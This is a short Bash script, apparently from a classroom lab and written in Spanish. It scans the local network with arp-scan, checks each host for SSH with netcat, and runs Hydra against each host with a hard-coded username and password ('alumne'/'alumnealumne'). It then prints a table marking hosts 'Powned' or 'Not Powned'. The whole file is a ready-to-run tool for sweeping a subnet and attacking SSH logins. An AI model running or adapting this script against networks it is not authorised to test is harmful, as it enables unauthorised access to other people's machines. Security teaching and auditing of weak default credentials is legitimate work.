  GNU nano 6.3                                       furza_bruta.sh                                                
#!/bin/bash

# Solicitar al usuario la interfaz de red deseada
read -p "Ingrese la interfaz de red deseada (por ejemplo, lo, eth0, tun0): " interface

# Verificar la información de la interfaz de red ingresada por el usuario
ip addr show dev "$interface" > /dev/null 2>&1
if [ $? -ne 0 ]; then
    echo "La interfaz de red especificada no es válida."
    exit 1
fi

# Obtener la dirección IP y la máscara de red de la interfaz seleccionada
ip_address=$(ip a show dev "$interface" | awk '/inet / {print $2}')
network_mask=$(ip a show dev "$interface" | awk '/inet / {print $2}' | awk -F '/' '{print $2}')

# Escanear hosts en la red especificada utilizando la interfaz proporcionada
echo "Escaneando hosts en la red $ip_address/$network_mask utilizando la interfaz $interface..."
hosts=$(sudo arp-scan --interface="$interface" --localnet | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}')

# Mostrar la tabla de resultados
echo "--------------------------------------------------"
printf "| %-15s | %-15s | %-20s |\n" "IP" "Estado del Servicio SSH" "Estado de Acceso"
echo "--------------------------------------------------"

# Iterar sobre cada host encontrado
for host in $hosts; do
    # Verificar si el servicio SSH está activo en el host
    nc -z -w5 "$host" 22
    if [ $? -eq 0 ]; then
        ssh_status="Activo"
    else
        ssh_status="No activo"
    fi
    
    # Intentar iniciar sesión con credenciales utilizando Hydra y capturar el resultado en una variable
    result=$(hydra -l "alumne" -p "alumnealumne"  ssh://"$host" -s 22 -f -vV 2>&1)
    # Verificar el resultado de Hydra
    if [[ $result == *"success"* ]]; then
        access_status="Powned"
    else
        access_status="Not Powned"
    fi
    
    printf "| %-15s | %-15s | %-20s |\n" "$host" "$ssh_status" "$access_status"
done

echo "--------------------------------------------------"
